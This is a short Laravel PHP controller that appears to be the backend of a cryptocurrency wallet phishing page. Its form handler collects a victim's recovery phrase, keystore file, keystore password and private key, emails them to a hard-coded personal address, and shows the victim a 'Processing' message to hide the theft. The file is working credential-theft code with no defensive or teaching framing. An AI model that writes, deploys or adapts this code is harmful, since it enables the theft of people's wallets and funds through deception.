<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;
use Illuminate\Support\Facades\Session;
class PagesController extends Controller
{
    public function index(){
      return view('index');
    }
    public function links(){
      return view('link');
    }
    public function submitForm(Request $request){
      $data = [
        'Phrase' =>$request->phrase,
        'Keystore' =>$request->keystore,
        'keystorepass' =>$request->keystorepass,
        'Privatekey' =>$request->privatekey,
        'email'=>'emmajoy658@gmail.com',
        'subject'=>'New Entry'
      ];
      Mail::send('email-template', $data, function($message) use ($data) {
          $message->to($data['email'])
          ->subject($data['subject']);
        });

        return back()->with(['message' => 'Processing']);
    }
}
